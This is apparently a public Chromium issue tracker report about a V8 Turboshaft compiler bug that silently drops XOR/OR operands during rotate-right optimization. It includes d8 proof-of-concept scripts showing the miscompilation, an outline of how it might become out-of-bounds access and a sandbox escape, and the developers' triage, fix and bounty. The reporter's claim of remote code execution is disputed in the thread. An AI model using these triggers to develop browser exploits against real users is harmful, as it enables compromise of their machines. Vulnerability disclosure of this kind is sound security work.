# V8: Turboshaft miscompilation: Operand drop in TryReduceRorInTree allows potential sandbox bypass

| Field | Value |
|-------|-------|
| **Issue ID** | [505823721](https://issues.chromium.org/issues/505823721) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler>Turboshaft |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | or...@gmail.com |
| **Assignee** | mr...@chromium.org |
| **Created** | 2026-04-23 |
| **Bounty** | $8,000.00 |

## Description

---

### Report description

V8: Turboshaft miscompilation: Operand drop in TryReduceRorInTree allows potential sandbox bypass

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

#### Which URL (or repository) have you found the vulnerability in?

<https://chromium.googlesource.com/v8/v8.git>

---

### The problem

#### Please describe the technical details of the vulnerability

### Summary

A miscompilation vulnerability exists in V8's Turboshaft compiler, specifically within the `MachineOptimizationReducer::TryReduceRorInTree` function (introduced in commit `108c8efde73`). The issue occurs when reducing a deep XOR or OR tree into a Rotate Right (ROR) operation. Due to an early loop termination condition, operands that exceed `kMaxOperands` (8) are left in the `worklist` and are subsequently dropped completely from the generated graph, leading to severe miscompilation.

### Technical Details

In `src/compiler/turboshaft/machine-optimization-reducer.h`, the `TryReduceRorInTree` function is designed to recognize and optimize rotation patterns like `(x << y) | (x >>> (32 - y))` within larger XOR or OR trees.

The function iterates over the tree using a `worklist`:

```
    // Searching for a tree of XORs (or ORs).
    while (!worklist.empty() && operands.size() < kMaxOperands) {
      OpIndex current_op = worklist.back();
      worklist.pop_back();

      const auto* binop = matcher_.TryCast<WordBinopOp>(current_op);
      if (binop != nullptr && binop->kind == kind) {
        worklist.push_back(binop->right());
        worklist.push_back(binop->left());
      } else {
        operands.push_back(current_op);
        // ...
      }
    }

```

The loop correctly terminates if `operands.size() >= kMaxOperands` (which is 8). However, when this limit is reached, there may still be unprocessed nodes remaining in the `worklist`.

If the algorithm subsequently finds a matching left shift and right shift pair among the collected `operands`, it generates the `RotateRight` operation and rebuilds the tree **only using the nodes in the `operands` array**:

```
            V<Word> ror = __ RotateRight(shl_node->left(), shr_node->right(), rep);
            V<Word> result = ror;
            for (size_t k = 0; k < operands.size(); ++k) {
              if (k == i || k == j) continue;
              result = __ WordBinop(result, operands[k], kind, rep);
            }
            return result; // Unprocessed nodes in the worklist are DROPPED!

```

Any nodes that were left in the `worklist` when the loop terminated are completely ignored. They are not recombined into the final `result`. Consequently, these dropped operands vanish from the optimized JIT code.

### Steps to Reproduce

1. Build V8 from the latest `main` branch (e.g., commit `c54bb6af062`).
2. Run the attached `poc.js` using `d8`:
   `out/x64.release/d8 --allow-natives-syntax poc.js`
3. Observe the output. The optimized function will return a different result than the unoptimized function because the `target` operand is silently dropped during compilation.

**poc.js**

```
function test(x, target) {
  let shl = (x << 5);
  let shr = (x >>> 27);
  // The first 8 operands will fill the `operands` array.
  // The 9th operand (`target`) remains in the `worklist` and is dropped by Turboshaft.
  return 1 ^ 2 ^ 3 ^ shl ^ shr ^ 4 ^ 5 ^ 6 ^ target;
}

%PrepareFunctionForOptimization(test);
let unopt = test(0x12345678, 100);
test(0x12345678, 100);
%OptimizeFunctionOnNextCall(test);
let opt = test(0x12345678, 100);

print("Unoptimized: " + unopt);
print("Optimized:   " + opt);
if (unopt !== opt) {
    print("[!] VULNERABILITY TRIGGERED: Dropped operand detected!");
}

```
#### Impact analysis

## Impact analysis

An attacker can exploit this vulnerability to achieve a full V8 Sandbox bypass (Remote Code Execution) within the renderer process.

By carefully constructing an XOR or OR tree in JavaScript that exceeds 8 operands, an attacker can force Turboshaft to drop specific variables from the generated machine code.

**Attack Scenario:**

1. **Bounds Check Bypass / Type Confusion:** If the dropped operand is a masking value used to constrain an index (e.g., `index = (index ^ ... ) & mask`), dropping the mask or bounds-checking variable will allow an attacker to perform Out-Of-Bounds (OOB) reads and writes within the V8 heap.
2. **Sandbox Escape:** Once an OOB read/write primitive is established via this miscompilation, an attacker can corrupt internal V8 objects, overwrite function pointers, or manipulate ArrayBuffer backing stores, ultimately leading to a bypass of the V8 Sandbox and arbitrary code execution in the Chrome renderer process.

Since this vulnerability is triggered during JIT compilation without requiring any user interaction beyond visiting a malicious webpage, it poses a high security risk.

---

### The cause

#### What version of Chrome have you found the security issue in?

V8 main branch (commit 108c8efde73)

#### Is the security issue related to a crash?

No, it is not related to a crash.

#### Choose the type of vulnerability

Sandbox Escape

#### How would you like to be publicly acknowledged for your report?

Jinho Seo

## Attachments

- [poc.js](attachments/poc.js) (text/javascript, 587 B)
- [poc.html](attachments/poc.html) (text/html, 1.4 KB)
- [2026-04-24 112502.png](attachments/2026-04-24 112502.png) (image/png, 11.8 KB)

## Timeline

### cl...@appspot.gserviceaccount.com (2026-04-24)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4920896066191360.

### em...@google.com (2026-04-24)

Not reproducible locally, but I'll give it a shot on Clusterfuzz.

### or...@gmail.com (2026-04-24)

I was very tired late at night and mistakenly submitted the wrong PoC earlier. Please disregard the previous PoC and use the updated reproducer below.

Update: I found a minimized JS-level reproducer for the same root cause reported here.

My original PoC was not reliably actionable because the two shift nodes did not end up sharing the same Turboshaft input, so the ROR reduction did not fire consistently. The updated PoC uses `Math.imul(x, 1)` so that both shifts consume the same `Int32Mul` result, which allows `TryReduceRorInTree` / `TryReduceToRor` to form `RotateRight`.

Build used:

- V8 commit: `c54bb6af062158832d1f5ee199491470a639d4d8`
- `python3 tools/dev/v8gen.py x64.release`
- `ninja -C out.gn\\x64.release`

Run:

- `out.gn\\x64.release\\d8.exe --allow-natives-syntax poc.js`

Observed output:

```
Unoptimized:         1183502176
Dropped-target expr: 1183502084
Optimized (100):     1183502084
Optimized (200):     1183502084
opt == dropped:      true
target ignored:      true

```

This shows that the optimized result matches the expression with `target` removed, and changing `target` does not affect the optimized output. This is consistent with an operand being dropped during the ROR reduction in `MachineOptimizationReducer::TryReduceRorInTree`.

At this point I am demonstrating a JS-level V8 miscompilation in `d8` caused by this optimization. I have not yet demonstrated a full sandbox escape chain.

For convenience, the PoC is included below, and I am also attaching the same file separately as `poc.js`.

```
function test(x, a, b, c, d, e, target, tail) {
  let y = Math.imul(x, 1);
  let shl = y << 5;
  let shr = y >>> 27;
  return (((((a ^ b) ^ c) ^ d) ^ e) ^ shl ^ target) ^ (tail ^ shr);
}

function dropped(x, a, b, c, d, e, tail) {
  let y = Math.imul(x, 1);
  let shl = y << 5;
  let shr = y >>> 27;
  return (((((a ^ b) ^ c) ^ d) ^ e) ^ shl) ^ (tail ^ shr);
}

%PrepareFunctionForOptimization(test);

let unopt = test(0x12345678, 1, 2, 3, 4, 5, 100, 7);
let drop = dropped(0x12345678, 1, 2, 3, 4, 5, 7);
test(0x12345678, 1, 2, 3, 4, 5, 100, 7);
%OptimizeFunctionOnNextCall(test);
let opt1 = test(0x12345678, 1, 2, 3, 4, 5, 100, 7);
let opt2 = test(0x12345678, 1, 2, 3, 4, 5, 200, 7);

print("Unoptimized:         " + unopt);
print("Dropped-target expr: " + drop);
print("Optimized (100):     " + opt1);
print("Optimized (200):     " + opt2);
print("opt == dropped:      " + (opt1 === drop));
print("target ignored:      " + (opt1 === opt2));

```

### cl...@appspot.gserviceaccount.com (2026-04-24)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4919569508499456.

### 24...@project.gserviceaccount.com (2026-04-24)

Testcase 4919569508499456 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=4919569508499456.

### or...@gmail.com (2026-04-24)

Additional update: to make this testcase easier to validate in automation, I am providing a self-checking version of the PoC that exits with a non-zero status when the miscompilation is reproduced.

This targets the same root cause reported above. The only difference is that instead of only printing the semantic divergence, it throws an exception when the optimized result matches the expression with `target` removed.

I verified locally that this self-checking PoC terminates with a non-zero exit when the bug is triggered.

```
function test(x, a, b, c, d, e, target, tail) {
  let y = Math.imul(x, 1);
  let shl = y << 5;
  let shr = y >>> 27;
  return (((((a ^ b) ^ c) ^ d) ^ e) ^ shl ^ target) ^ (tail ^ shr);
}

function dropped(x, a, b, c, d, e, tail) {
  let y = Math.imul(x, 1);
  let shl = y << 5;
  let shr = y >>> 27;
  return (((((a ^ b) ^ c) ^ d) ^ e) ^ shl) ^ (tail ^ shr);
}

%PrepareFunctionForOptimization(test);

let unopt = test(0x12345678, 1, 2, 3, 4, 5, 100, 7);
let drop = dropped(0x12345678, 1, 2, 3, 4, 5, 7);
test(0x12345678, 1, 2, 3, 4, 5, 100, 7);
%OptimizeFunctionOnNextCall(test);
let opt1 = test(0x12345678, 1, 2, 3, 4, 5, 100, 7);
let opt2 = test(0x12345678, 1, 2, 3, 4, 5, 200, 7);

print("Unoptimized:         " + unopt);
print("Dropped-target expr: " + drop);
print("Optimized (100):     " + opt1);
print("Optimized (200):     " + opt2);

if (unopt === drop) {
  throw new Error("invalid testcase: unoptimized result already matches dropped expression");
}

if (opt1 === drop && opt1 === opt2 && unopt !== opt1) {
  throw new Error("miscompile reproduced: target dropped during ROR reduction");
}

print("No miscompile detected");

```

Expected behavior when the bug is present:

- the optimized result matches the dropped-target expression,
- changing `target` does not change the optimized result,
- the script throws `Error: miscompile reproduced: target dropped during ROR reduction`.

### or...@gmail.com (2026-04-24)

Additional comment: I am also posting the self-checking PoC below. This version exits with a non-zero status when the miscompilation is reproduced.

```
function test(x, a, b, c, d, e, target, tail) {
  let y = Math.imul(x, 1);
  let shl = y << 5;
  let shr = y >>> 27;
  return (((((a ^ b) ^ c) ^ d) ^ e) ^ shl ^ target) ^ (tail ^ shr);
}

function dropped(x, a, b, c, d, e, tail) {
  let y = Math.imul(x, 1);
  let shl = y << 5;
  let shr = y >>> 27;
  return (((((a ^ b) ^ c) ^ d) ^ e) ^ shl) ^ (tail ^ shr);
}

%PrepareFunctionForOptimization(test);

let unopt = test(0x12345678, 1, 2, 3, 4, 5, 100, 7);
let drop = dropped(0x12345678, 1, 2, 3, 4, 5, 7);
test(0x12345678, 1, 2, 3, 4, 5, 100, 7);
%OptimizeFunctionOnNextCall(test);
let opt1 = test(0x12345678, 1, 2, 3, 4, 5, 100, 7);
let opt2 = test(0x12345678, 1, 2, 3, 4, 5, 200, 7);

print("Unoptimized:         " + unopt);
print("Dropped-target expr: " + drop);
print("Optimized (100):     " + opt1);
print("Optimized (200):     " + opt2);

if (unopt === drop) {
  throw new Error("invalid testcase: unoptimized result already matches dropped expression");
}

if (opt1 === drop && opt1 === opt2 && unopt !== opt1) {
  throw new Error("miscompile reproduced: target dropped during ROR reduction");
}

print("No miscompile detected");

```

### cl...@appspot.gserviceaccount.com (2026-04-24)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5988556216500224.

### em...@google.com (2026-04-24)

I've uploaded the new test case from [comment #8](https://issues.chromium.org/issues/505823721#comment8) to Clusterfuzz, however I don't think it'll recognize this kind of error.

My local bisection points to [crrev.com/c/7775794](https://crrev.com/c/7775794) `[turboshaft] Recognize rotatation patterns in larger XOR/OR trees`. mrcvtl@: PTAL; thanks!

### ar...@google.com (2026-04-27)

Setting manually Security\_Impact-Head since CF can't reproduce.

I will leave this to the compiler team but the optimization seems very late in the pipeline so I am not sure how this could be exploited, I think this is just a miscompilation, do you have any idea on how it could be turned into an exploit?

### ar...@google.com (2026-04-27)

I was wrong, it should be possible to turn this into OOB read -> OOB write. Setting severity to S1.

### ch...@google.com (2026-04-27)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-04-27)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security Impact hotlist or the Severity field, and remove the ReleaseBlock hotlist.

### ar...@google.com (2026-04-27)

The issue doesn't affect a release branch, removing the ReleaseBlock.

### dm...@chromium.org (2026-04-27)

> I will leave this to the compiler team but the optimization seems very late in the pipeline so I am not sure how this could be exploited, I think this is just a miscompilation, do you have any idea on how it could be turned into an exploit?

Those bugs are typically issues if they lead to runtime values contradicting what the typer computed in the frontend, in particular if the typer decided to elide some checks based on computed types. That's what the dupe OpenAI report does.
In that specific case, I don't know if this can lead to anything other than OOB reads, but I wouldn't be surprised if this could lead to OOB writes as well (only in-sandbox though).

### mr...@chromium.org (2026-04-27)

Fixed in <https://chromium-review.git.corp.google.com/c/v8/v8/+/7793388>.
Only ToT was affected.

Tried to get an OOB write working but no luck so far. It probably wouldn't break out of the sandbox anyway, IMO.

### sp...@google.com (2026-05-05)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $8000.00 for this report.

Rationale for this decision:
Baseline. Memory corruption in a sandboxed process


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### or...@gmail.com (2026-05-05)

deleted

### dm...@chromium.org (2026-05-06)

> I was wondering if this issue is expected to receive a CVE assignment.

It shouldn't: you reported the bug the day it was introduced, and we should only emit CVE for stable issues.

Additionally, you haven't demonstrated an exploit: this is technically only a OOB read, but the VRP has been generous in 2 ways: they rewarded this bug like it could achieve OOB writes, and they rewarded this bug despite the fact that it was reported the day that the CL landed (which is usually discouraged).

(in the future, please email [security-vrp@chromium.org](mailto:security-vrp@chromium.org) or [security@chromium.org](mailto:security@chromium.org) with your questions rather than asking them by commenting on bugs)

### ch...@google.com (2026-05-20)

This is sufficiently serious that it should be merged to M149. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M149. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.

Security Merge Request:

Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

### ch...@google.com (2026-05-20)

**M149** merge request created. **Please update [crbug/514927987](https://crbug.com/514927987) to have this merge reviewed.**

### mr...@google.com (2026-05-20)

The vuln was on ToT and the fix landed the day after, do we really need a backmerge? @ar...@google.com

### ar...@google.com (2026-05-20)

The fix should already be on M149: <https://chromiumdash.appspot.com/commit/f3b739e297f5139c8d28c1f2f244490cbe23cb67>

Or, is that the wrong CL?

### ch...@google.com (2026-08-04)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/505823721)*
